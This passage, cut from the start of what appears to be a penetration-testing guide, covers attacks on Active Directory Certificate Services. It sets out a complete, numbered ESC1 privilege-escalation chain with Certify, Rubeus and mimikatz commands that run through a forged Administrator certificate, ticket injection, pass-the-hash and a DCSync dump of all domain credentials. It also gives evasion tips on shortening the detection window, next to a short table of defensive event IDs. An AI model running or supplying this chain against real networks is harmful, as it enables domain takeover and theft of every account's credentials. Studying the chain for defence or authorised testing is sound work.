mimikatz.exe "lsadump::dcsync /domain:TARGET_DOMAIN /user:Administrator" exit

# Or using secretsdump from Kali with NTLM hash of DC machine account
# secretsdump.py TARGET_DOMAIN/DC_HOSTNAME$@DC_IP -hashes :NTLM_HASH
```

---

## Defensive Indicators and Evasion Notes

### Event IDs to Know (Blue Team Awareness)

| Event ID | Source | Trigger |
|----------|--------|---------|
| 4886 | Security | Certificate Services received a certificate request |
| 4887 | Security | Certificate Services approved and issued a certificate |
| 4888 | Security | Certificate Services denied a certificate request |
| 4768 | Security | Kerberos TGT request (AS-REQ) — PKINIT shows cert auth |
| 4771 | Security | Kerberos pre-authentication failed |

### Evasion Considerations

- Certificate requests from unexpected users to sensitive templates generate 4886/4887
- Requesting a certificate with an Administrator SAN from a low-privilege account is a high-fidelity IOC
- Rubeus `asktgt` generates a normal 4768 event — the `PA-DATA` type will show `padata-pk-as-req` for PKINIT
- ForgeCert certificates do NOT generate CA request logs (offline forgery) — the only detection is anomalous PKINIT with a cert that is not in the CA database
- Restore modified templates promptly (ESC4) to reduce detection window

---

## End-to-End Attack Chain Example

Starting from a standard domain user (`USERNAME` with password `PASSWORD`), escalating to Domain Admin via ESC1:

```
# 1. Enumerate from Windows foothold
Certify.exe find /vulnerable

# 2. Confirm ESC1 template: msPKI-Certificate-Name-Flag has ENROLLEE_SUPPLIES_SUBJECT,
#    pkiextendedkeyusage has Client Authentication, Domain Users can enroll

# 3. Request certificate with Administrator SAN
Certify.exe request /ca:CA_HOSTNAME\CA_NAME /template:TEMPLATE_NAME /altname:Administrator

# 4. Convert PEM to PFX
certutil -MergePFX cert.pem cert.pfx

# 5. Use certificate to get TGT as Administrator (PKINIT)
Rubeus.exe asktgt /user:Administrator /certificate:C:\Temp\cert.pfx /password:CERT_PASS /domain:TARGET_DOMAIN /dc:DC_HOSTNAME /ptt

# 6. Verify ticket injection
klist

# 7. Access DC
dir \\DC_HOSTNAME\C$

# 8. Optionally: extract Administrator NTLM hash for Pass-the-Hash
Rubeus.exe asktgt /user:Administrator /certificate:C:\Temp\cert.pfx /password:CERT_PASS /domain:TARGET_DOMAIN /dc:DC_HOSTNAME /getcredentials /show

# 9. DCSync with hash using Mimikatz
mimikatz.exe "sekurlsa::pth /user:Administrator /domain:TARGET_DOMAIN /ntlm:NTLM_HASH /run:cmd.exe" exit
# In new cmd: mimikatz.exe "lsadump::dcsync /domain:TARGET_DOMAIN /all /csv" exit
```

---

## References

- SpecterOps — "Certified Pre-Owned" whitepaper (Will Schroeder, Lee Christensen)
- Certify GitHub: `https://github.com/GhostPack/Certify`
- ForgeCert GitHub: `https://github.com/GhostPack/ForgeCert`
- Rubeus GitHub: `https://github.com/GhostPack/Rubeus`
- CVE-2022-26923 (Certifried): Microsoft KB5014754
- PKINIT and Certificate-Based Authentication: RFC 4556

---

> **Disclaimer:** For educational purposes only. Unauthorized access to computer systems is illegal.
